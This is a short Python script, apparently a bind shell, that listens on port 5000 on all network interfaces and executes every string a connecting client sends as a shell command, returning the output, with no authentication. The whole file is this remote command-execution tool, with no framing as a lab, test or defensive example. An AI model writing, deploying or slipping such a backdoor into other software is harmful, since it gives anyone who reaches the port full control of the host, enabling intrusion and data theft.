import socket
import subprocess

SERVER_HOST = '0.0.0.0'  # Listen on all available interfaces
SERVER_PORT = 5000

def start_server():
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((SERVER_HOST, SERVER_PORT))
    server_socket.listen(1)
    print(f"[*] Listening on {SERVER_HOST}:{SERVER_PORT}")

    client_socket, client_address = server_socket.accept()
    print(f"[*] Accepted connection from {client_address[0]}:{client_address[1]}")

    while True:
        command = client_socket.recv(1024).decode()
        if command.lower() == "exit":
            break
        output = subprocess.getoutput(command)
        client_socket.send(output.encode())

    client_socket.close()
    server_socket.close()

start_server()
